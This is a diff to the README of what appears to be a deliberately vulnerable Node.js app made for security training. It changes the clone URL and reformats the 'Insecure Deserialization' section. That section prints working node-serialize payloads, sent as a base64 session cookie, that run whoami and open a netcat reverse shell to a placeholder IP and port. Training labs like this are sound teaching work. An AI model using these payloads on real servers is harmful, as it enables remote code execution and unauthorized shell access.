@@ -6,7 +6,7 @@ This is a vulnerable web application designed for educational purposes. It conta
 
 ## Installation
 
-1. Clone the repository: `git clone https://github.com/your-username/Damn-Vulnerable-Web-App.git`
+1. Clone the repository: `git clone https://github.com/turnernator1/Damn-Vulnerable-Web-App.git`
 2. Navigate to the server directory: `cd Damn-Vulnerable-Web-App/server`
 3. Install dependencies: `npm install`
 4. Start the server: `npm start`
@@ -23,12 +23,12 @@ The Damn Vulnerable CCX Site contains various vulnerabilities, including:
 
 ### Insecure Deserialization
 #### Demo Payloads
-- Base64 encode these payloads and set as the 'session' cookie value.
+Base64 encode these payloads and set as the 'session' cookie value.
 - WHOAMI 
- {"username":"_$$ND_FUNC$$_function (){\n \t const exec = require('child_process').execSync;\n \t const output = exec('whoami').toString().trim();\n \t return output ;\n }()"}
+{"username":"_$$ND_FUNC$$_function (){\n \t const exec = require('child_process').execSync;\n \t const output = exec('whoami').toString().trim();\n \t return output ;\n }()"}
  
 - REV SHELL
- {"username":"_$$ND_FUNC$$_function (){\n \t const exec = require('child_process').execSync;\n \t const output = exec('rm -f /tmp/f;mkfifo/tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f');\n \t return 'PWND';\n }()"}
+{"username":"_$$ND_FUNC$$_function (){\n \t const exec = require('child_process').execSync;\n \t const output = exec('rm -f /tmp/f;mkfifo/tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f');\n \t return 'PWND';\n }()"}
 
 Future versions of the application will include additional vulnerabilities, such as:
 - Cross-Site Scripting (XSS)
